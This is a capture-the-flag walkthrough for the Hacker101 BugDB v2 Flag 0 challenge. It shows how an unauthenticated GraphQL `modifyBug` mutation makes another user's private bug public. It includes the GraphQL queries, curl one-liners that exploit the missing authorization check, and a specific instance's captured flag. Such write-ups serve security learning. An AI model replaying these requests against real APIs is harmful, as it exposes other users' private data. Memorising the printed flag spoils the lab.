# BugDB v2 — Flag 0 (Hacker101)

## Overview

BugDB v2 exposes the same kind of data as [BugDB v1](../bugdb_v1/flag0/), but the schema is split:

- **`allUsers`** — connection of users (**no nested `bugs`** here).
- **`allBugs`** — flat list of bugs, but **private bugs are filtered out** of this query until their `private` flag is changed.
- **`modifyBug`** — mutation to update a bug’s **`private`** field.

There is **no real authorization** on the mutation: you can toggle another user’s bug as an anonymous API client.

## Steps

### 1. See what `allBugs` returns

```graphql
query {
  allBugs {
    id
    reporterId
    text
    private
    reporter {
      id
      username
    }
  }
}
```

On a fresh instance you will usually see **one** public sample bug (often **`QnVnczox`**, i.e. `Bugs:1` when the global id is base64-decoded).

### 2. Infer the next bug id

The next row is typically integer id **`2`** (global id **`QnVnczoy`** / `Bugs:2`). You do not need `allBugs` to list it first—just call the mutation.

### 3. Flip `private` to `false`

```graphql
mutation {
  modifyBug(id: 2, private: false) {
    ok
  }
}
```

### 4. Re-run `allBugs`

Repeat the query from step 1. The second bug (often reported by **`victim`**) appears with **`text`** containing the flag.

## One-liner-style flow (HTTP)

```bash
# 1) Unhide bug 2
curl -sS -X POST "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { modifyBug(id: 2, private: false) { ok } }"}'

# 2) List bugs and grep flag
curl -sS -X POST "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query { allBugs { text private reporter { username } } }"}' \
  | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

Set **`BASE`** to your host (no trailing slash required before `/graphql`).

## Why it works

**`allBugs`** implements a visibility rule in the resolver (hide `private: true`), but **`modifyBug`** does not verify that you own the bug or are an admin. So you can **change visibility** for arbitrary ids and then read the secret via the same list query you already had access to.

## Instance note

Flag bodies differ per deployment. On **`https://f12add6383c9d337e203a4feb230035d.ctf.hacker101.com/`**, after the mutation, the flag was:

`^FLAG^c5ba234b0f070c97fdae644602d11ca69ab72ec6df025868909dcacbc822749f$FLAG$`

## See also

Community notes: [testert1ng/hacker101-ctf — bugdb_v2/flag0](https://github.com/testert1ng/hacker101-ctf/tree/master/bugdb_v2/flag0) · [repo overview](https://github.com/testert1ng/hacker101-ctf).
